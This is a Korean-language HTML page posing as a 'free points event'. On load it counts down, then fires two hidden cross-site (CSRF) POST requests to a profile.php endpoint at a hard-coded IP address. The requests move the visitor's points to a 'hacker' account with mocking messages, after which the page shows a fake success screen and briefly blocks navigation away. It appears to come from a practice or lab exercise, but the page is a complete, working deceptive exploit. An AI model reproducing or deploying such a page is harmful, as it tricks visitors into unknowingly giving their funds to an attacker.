<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 특별 이벤트 - 무료 포인트 지급!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
            max-width: 500px;
            width: 90%;
        }
        .title { font-size: 2.5em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .subtitle { font-size: 1.2em; margin-bottom: 30px; opacity: 0.9; }
        .countdown { font-size: 3em; color: #FFD700; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); margin: 20px 0; }
        .progress-bar { width: 100%; height: 20px; background: rgba(255,255,255,0.3); border-radius: 10px; overflow: hidden; margin: 20px 0; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #00ff88, #00cc6a); width: 0%; transition: width 0.5s ease; border-radius: 10px; }
        .success { color: #00FF88; font-size: 1.8em; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .pulse { animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
        .attack-log { background: rgba(0,0,0,0.3); border-radius: 10px; padding: 15px; margin: 20px 0; font-family: monospace; font-size: 0.9em; text-align: left; max-height: 200px; overflow-y: auto; }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="title pulse">🎁 특별 이벤트!</h1>
        <p class="subtitle">무료 포인트 지급 시스템에 연결되었습니다</p>
        
        <div id="loading-section">
            <div class="loading">
                <p>💰 포인트 지급을 준비하고 있습니다...</p>
                <p class="countdown" id="countdown">3</p>
                <p>초 후 자동으로 포인트가 지급됩니다!</p>
            </div>
            <div class="progress-bar"><div class="progress-fill" id="progressBar"></div></div>
            <p id="status">🔄 시스템 연결 중...</p>
            <div id="attackLog" class="attack-log" style="display: none;"></div>
        </div>
        
        <div id="success-section" style="display: none;">
            <h2 class="success pulse">✅ 포인트 지급 완료!</h2>
            <p style="font-size: 1.3em; margin: 20px 0;">💰 55P가 성공적으로 지급되었습니다!</p>
            <p style="opacity: 0.8;">포인트는 즉시 계정에 반영됩니다.</p>
            <div id="finalLog" class="attack-log"></div>
        </div>
    </div>

    <script>
        let countdown = 3;
        const countdownEl = document.getElementById('countdown');
        const statusEl = document.getElementById('status');
        const progressBar = document.getElementById('progressBar');
        const loadingSection = document.getElementById('loading-section');
        const successSection = document.getElementById('success-section');
        const attackLog = document.getElementById('attackLog');
        const finalLog = document.getElementById('finalLog');
        
        const statusMessages = [
            '🔄 서버에 연결하고 있습니다...',
            '🔐 보안 인증을 확인하고 있습니다...',
            '💰 포인트 지급 시스템을 준비하고 있습니다...'
        ];
        
        let messageIndex = 0;
        let attackResults = [];
        
        function addLog(message) {
            const timestamp = new Date().toLocaleTimeString();
            const logMessage = `[${timestamp}] ${message}`;
            attackResults.push(logMessage);
            
            if (attackLog.style.display !== 'none') {
                attackLog.innerHTML = attackResults.join('<br>');
                attackLog.scrollTop = attackLog.scrollHeight;
            }
            
            console.log(logMessage);
        }
        
        // 파일 열리자마자 바로 카운트다운 시작
        const countdownTimer = setInterval(() => {
            countdown--;
            countdownEl.textContent = countdown;
            progressBar.style.width = ((3-countdown) * 33) + '%';
            
            if (messageIndex < statusMessages.length) {
                statusEl.textContent = statusMessages[messageIndex++];
            }
            
            if (countdown <= 0) {
                clearInterval(countdownTimer);
                executeRealAttack();
            }
        }, 1000);
        
        async function executeRealAttack() {
            console.log('🎯 CSRF 공격 시작...');
            statusEl.textContent = '💸 실제 포인트를 전송하고 있습니다...';
            progressBar.style.width = '100%';
            
            // 공격 로그 표시
            attackLog.style.display = 'block';
            addLog('🎯 CSRF 공격 시스템 초기화...');
            addLog('📋 타겟: hacker (ID: 13)');
            
            const attacks = [
                {
                    points: '30',
                    gift_type: 'coffee',
                    message: '어 개털렸죠?',
                    delay: 1000
                },
                {
                    points: '25', 
                    gift_type: 'cake',
                    message: '내가 가져간다 이 대머리야',
                    delay: 3000
                }
            ];
            
            let successfulAttacks = 0;
            let totalPointsStolen = 0;
            
            for (let i = 0; i < attacks.length; i++) {
                const attack = attacks[i];
                
                await new Promise(resolve => setTimeout(resolve, attack.delay));
                
                addLog(`🚀 공격 ${i+1} 시작: ${attack.points}P 전송 중...`);
                
                try {
                    const response = await fetch('http://3.35.218.180/profile.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: `receiver_id=13&points=${attack.points}&send_gift=1&gift_type=${attack.gift_type}&message=${encodeURIComponent(attack.message)}`
                    });
                    
                    const data = await response.text();
                    
                    addLog(`📡 HTTP Status: ${response.status}`);
                    
                    // 성공 여부 판단 (콘솔 테스트에서 확인된 방식)
                    if (response.status === 200 && (
                        data.includes('선물') || 
                        data.includes('전송') || 
                        data.includes('success') ||
                        data.includes('<!DOCTYPE html>') // 정상 페이지 응답
                    )) {
                        addLog(`✅ 공격 ${i+1} 성공: ${attack.points}P → hacker`);
                        successfulAttacks++;
                        totalPointsStolen += parseInt(attack.points);
                    } else {
                        addLog(`❌ 공격 ${i+1} 실패: 응답 이상`);
                    }
                    
                    // 응답 미리보기
                    const preview = data.substring(0, 100).replace(/\s+/g, ' ');
                    addLog(`📄 응답: ${preview}...`);
                    
                } catch (error) {
                    addLog(`❌ 공격 ${i+1} 네트워크 오류: ${error.message}`);
                }
            }
            
            // 완료 처리
            setTimeout(() => {
                showSuccess(successfulAttacks, totalPointsStolen);
            }, 2000);
        }
        
        function showSuccess(successCount, totalPoints) {
            loadingSection.style.display = 'none';
            successSection.style.display = 'block';
            document.title = '✅ 포인트 지급 완료!';
            
            // 최종 결과 로그
            finalLog.innerHTML = attackResults.join('<br>') + '<br><br>' + [
                '🎉 === 공격 완료 리포트 ===',
                `✅ 성공한 공격: ${successCount}/2`,
                `💰 탈취한 포인트: ${totalPoints}P`,
                `🏴‍☠️ 수혜자: hacker (ID: 13)`,
                `📊 성공률: ${(successCount/2*100).toFixed(0)}%`,
                '',
                '🔍 결과 확인:',
                '1. hacker 계정에 로그인하여 포인트 증가 확인',
                '2. bob 계정에서 포인트 감소 확인',
                '',
                '⚡ 공격이 성공했다면 CSRF 취약점이 존재합니다!',
                '🛡️ 보안 패치가 필요합니다.'
            ].join('<br>');
            
            console.log('🎉 === CSRF 공격 완료 ===');
            console.log(`✅ 성공: ${successCount}/2`);
            console.log(`💰 탈취: ${totalPoints}P`);
            console.log('🏴‍☠️ hacker 계정에서 포인트 확인해보세요!');
        }
        
        // 페이지 언로드 방지
        let preventUnload = true;
        window.addEventListener('beforeunload', function(e) {
            if (preventUnload) {
                e.preventDefault();
                return '포인트 지급이 진행 중입니다.';
            }
        });
        setTimeout(() => { preventUnload = false; }, 15000);
        
        console.log('🎯 실제 작동하는 CSRF 페이지 로드 완료');
        console.log('📋 타겟: hacker (ID: 13)');
        console.log('💰 총 포인트: 55P (30+25)');
        console.log('🚀 콘솔 테스트로 검증된 방법 사용!');
    </script>
</body>
</html>
